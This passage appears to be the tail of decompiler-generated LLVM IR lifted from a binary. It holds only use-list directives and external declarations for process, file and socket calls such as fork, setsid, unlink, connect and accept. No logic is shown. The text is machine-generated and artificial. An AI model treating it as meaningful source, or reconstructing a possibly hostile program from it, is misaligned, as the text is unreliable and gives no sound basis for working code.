116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448 }
  uselistorder i32* @ra, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0 }
}

declare i32 @unknown_0() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @chdir(i8*) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @getppid() local_unnamed_addr

declare i32 @getrlimit(i32, %rlimit*) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @readlink(i8*, i8*, i32) local_unnamed_addr

declare i32 @setsid() local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @unlink(i8*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @accept(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @bind(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @getsockname(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @getsockopt(i32, i32, i32, i32*, i32*) local_unnamed_addr

declare i32 @listen(i32, i32) local_unnamed_addr

declare i32 @recv(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @recvfrom(i32, i32*, i32, i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @send(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare i32 @socket(i32, i32, i32) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @sys_clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @fstat(i32, %stat*) local_unnamed_addr

declare i32 @getegid() local_unnamed_addr

declare i32 @geteuid() local_unnamed_addr

declare i32 @getgid() local_unnamed_addr

declare i32 @getuid() local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @times(%tms*) local_unnamed_addr

declare i32 @brk(i32*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16 @__decompiler_undefined_function_2() local_unnamed_addr

attributes #0 = { noreturn }
